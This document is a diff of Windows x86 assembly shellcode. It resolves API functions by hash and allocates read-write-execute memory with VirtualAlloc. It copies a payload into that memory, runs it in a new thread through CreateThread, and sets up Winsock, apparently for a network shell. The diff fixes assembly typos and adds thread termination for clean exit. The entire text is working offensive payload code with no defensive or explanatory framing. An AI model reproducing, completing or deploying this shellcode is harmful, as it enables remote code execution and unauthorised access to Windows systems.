@@ -5,27 +5,44 @@ global _start
 _start:
 
 	cld				;clear direction flags
-
-prep_payload_addr:
+;LPVOID WINAPI VirtualAlloc(  _In_opt_  LPVOID lpAddress,  _In_      SIZE_T dwSize,  _In_      DWORD flAllocationType,  _In_      DWORD flProtect)
+;VirtualAlloc	0x54CAAF91
 	xor eax,eax
-	FLDZ					; get address of current instruction
-	FSTENV [ESP - 0xC]
-	pop ecx					; pop it to ecx
-	mov al,0x1e				; mov to al 0x1e
-	add ecx,eax				; add eax to ecx
+	mov esi,0x159			; shellcode size
+	push byte 0x40			; 0x40 PAGE_READ/WRITE_EXECUTE
+	push 0x1000			; MEM_COMMIT
+	push esi			; PUSH SIZE
+	push eax			; address = NULL
+	push 0x91AFCA54
+	call api_call
+
+	mov edx,eax			; edx = &memory
+	mov edi,eax			; prepare edi with memory address for rep movsb
+	mov ecx,esi			; put size in ecx
+
+	call payload
+save:
+	pop esi				;save address of payload in memory
+	rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
+	call thread			;
+
+
+thread:
 ;CreateThread(lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
 ;CreateThread(*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
 	xor eax,eax
 	push eax		; lpthreadid = NULL
 	push eax		; dwcreationflag = 0
 	push eax		; lpparameter = NULL
-	push ecx		; start address of thread
+	push edx		; start address of thread
 	push eax		; dwstacksize	= NULL
 	push eax		; lpthreadattributes = NULL
 	push 0xCA2BD06B         ; push hash of createthread()
     call api_call           ; call createthread()
 
 	pop eax					;pop threadid returned so process will run and return when done 
+payload:
+	call save
 	cld						; clear direction flag
 	call start				; call start
 ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
@@ -45,7 +62,7 @@ api_call:
 next_mod:
 	mov esi,[edx+0x28]		; esi = modulename in unicode
 	push edx				; save position in order list on stack
-	mov edx[edx+0x10]		; get this module base addr
+	mov edx,[edx+0x10]		; get this module base addr
 	mov eax,[edx+0x3c]		; jmp over PE Header
 	mov eax,[edx+eax+0x78]	; eax = RVA of Export Table
 	test eax,eax				; if export table doesnt exist
@@ -113,7 +130,7 @@ start:
 ;WSAStartup(WORD wVersionRequested,struct LPWSADATA lpWSAData)
 	xor edx,edx				; zero out eax
 	mov dh,0x03				; set edx = 0x00000300 because LPWSDATA needs 300 bytes on stack
-	sup esp,edx				; save space on stack
+	sub esp,edx				; save space on stack
 ;initialize WSAStatrup socket
 	xor ecx,ecx
 	inc ecx	
@@ -199,4 +216,17 @@ start:
 ;exitprocess	0x7ED8E273
 ;	push 0x73E2D87E
 ;	call ebp
+
+;0xE4CFCDE8              GetCurrentThread
+	push 0xE8CDCFE4		; GetCuurentThread() hash	
+	call ebp		; call it current thread handle is in eax
+;0x896F01BD              TerminateThread
+	xor ecx,ecx		; zero out ecx
+	push ecx		; dw milliseconds = 0
+	push eax		; push current thread handle
+	push 0xBD016F89		; push TerminateThread() hash
+	call ebp		; call TerminateThread(handle,dwmilliseconds)
+	nop
+	nop
+exit:
 	
